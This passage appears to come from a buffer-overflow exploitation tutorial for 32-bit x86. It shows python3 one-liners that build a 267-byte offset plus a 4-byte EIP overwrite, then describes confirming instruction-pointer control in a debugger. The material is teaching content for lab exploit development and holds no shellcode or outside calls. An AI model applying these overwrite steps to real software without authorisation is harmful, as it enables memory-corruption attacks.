## Payload Structure
Once the offset is determined, our payload structure on x86 architecture will be: [offset bytes] + [4 byte EIP address]. The 4 byte size corresponds to EIP's 32-bit register size in this architecture.


<img width="1281" height="60" alt="image" src="https://github.com/user-attachments/assets/d864f19c-57ee-45db-9563-6e98309d86a3" />


```bash
r $(python3 -c "import sys; sys.stdout.buffer.write(b'E' * 267 + b'k' * 4)")  # Option 1

r $(python3 -c "import sys; offset = b'E' * 267; eip = b'k' * 4; sys.stdout.buffer.write(offset + eip)")   # Option 2 (Saving values to variables)

```

## Confirming Control
The EIP value must correspond precisely to the memory address shown when the program crashes.

<img width="1278" height="767" alt="image" src="https://github.com/user-attachments/assets/b3c4ee2c-c0e7-4390-b883-5ff4cf0cc6d8" />

The image shows the 4 bytes we used to overwrite EIP during the crash. Remember, if you are not using GEF the ```info registers``` command can confirm the exact EIP value. A match between these values confirms successful control of the instruction pointer.
